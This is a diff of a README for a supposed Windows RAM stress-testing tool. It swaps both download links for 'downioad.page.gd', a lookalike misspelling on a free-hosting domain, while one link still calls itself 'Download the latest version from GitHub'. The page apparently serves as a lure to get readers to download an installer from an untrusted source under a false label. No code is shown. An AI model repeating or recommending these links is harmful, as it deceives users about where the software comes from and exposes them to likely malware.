@@ -2,7 +2,7 @@
 
 RAM Stress Test is a powerful and reliable software tool designed to thoroughly evaluate the stability and performance of your computer's RAM modules. It utilizes advanced algorithms to conduct stress tests, helping users identify potential memory issues and ensure system reliability on Windows desktops. Whether you're a gamer, system builder, or IT professional, this tool provides essential diagnostics to prevent crashes and data loss.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -67,6 +67,6 @@ A: Results are displayed in a summary with stability scores and error counts. De
 
 To get the latest version of RAM Stress Test Stability Checker, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Last Updated: 2026
